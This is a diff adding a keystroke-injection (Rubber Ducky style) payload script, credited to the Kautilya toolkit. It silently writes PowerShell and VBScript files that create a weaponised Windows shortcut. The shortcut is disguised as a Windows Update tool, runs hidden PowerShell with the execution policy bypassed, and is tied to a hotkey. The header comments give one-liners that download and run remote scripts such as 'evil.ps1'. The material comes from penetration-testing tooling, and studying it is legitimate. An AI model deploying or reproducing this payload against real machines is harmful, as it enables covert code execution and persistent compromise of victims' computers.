@@ -1,0 +1,33 @@
+REM Credits to samratashok @ https://github.com/samratashok/Kautilya/blob/master/lib/src/drop_shortcut.ino
+REM This payload drops an infected/weaponized Shortcut file (.lnk) on a target.
+REM It is able to execute a PowerShell command or one-liner on the target.
+REM To execute scripts use this: IEX ((New-Object Net.WebClient).DownloadString('http://yourwebserver/evil.ps1'));EvilFunction.
+REM To use scripts from Nishang(https://github.com/samratashok/nishang)use above.
+REM For example, IEX ((New-Object Net.WebClient).DownloadString('http://yourwebserver/Get-Information.ps1'));Get-Information
+REM See this blog post for detailed usage: http://www.labofapenetrationtester.com/2015/01/dropping-weaponized-files-using-hid.html
+REM
+REM Replace $COMMAND (command to be executed), $SHORTCUT (e.g. notepad.exe), and $FILENAME (name of shortcut)
+REM WIN8CMD can be replaced with WIN7CMD
+REM
+DELAY 1000
+WIN8CMD
+DELAY 500
+STRING echo $wsl = New-Object -comObject WScript.Shell > %temp%\\dsct.ps1
+STRING echo $Pld = \" -WindowStyle hidden -ep bypass -nologo -noprofile -c INPUT0 \" >> %temp%\\dsct.ps1
+STRING echo $Hky = \"$COMMAND\" >> %temp%\\dsct.ps1
+STRING echo $Icn = \"$SHORTCUT\" >> %temp%\\dsct.ps1
+STRING echo $OFile = \"$FILENAME\" >> %temp%\\dsct.ps1
+STRING echo $sct = $wsl.CreateShortcut($OFile) >> %temp%\\dsct.ps1
+STRING echo $sct.TargetPath = \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" >> %temp%\\dsct.ps1
+STRING echo $sct.Description = \"Shortcut to Windows Update Commandline\" >> %temp%\\dsct.ps1
+STRING echo $sct.WindowStyle = 7 >> %temp%\\dsct.ps1
+STRING echo $sct.Hotkey = $Hky >> %temp%\\dsct.ps1
+STRING echo $sct.IconLocation = \"$Icn,0\" >> %temp%\\dsct.ps1
+STRING echo $sct.Arguments = $Pld >> %temp%\\dsct.ps1
+STRING echo $sct.Save() >> %temp%\\dsct.ps1
+STRING echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dsct.vbs
+STRING echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dsct.ps1\"),0,true >> %temp%\\dsct.vbs
+DELAY 1000
+STRING wscript %temp%\\dsct.vbs
+DELAY 3000
+STRING exit
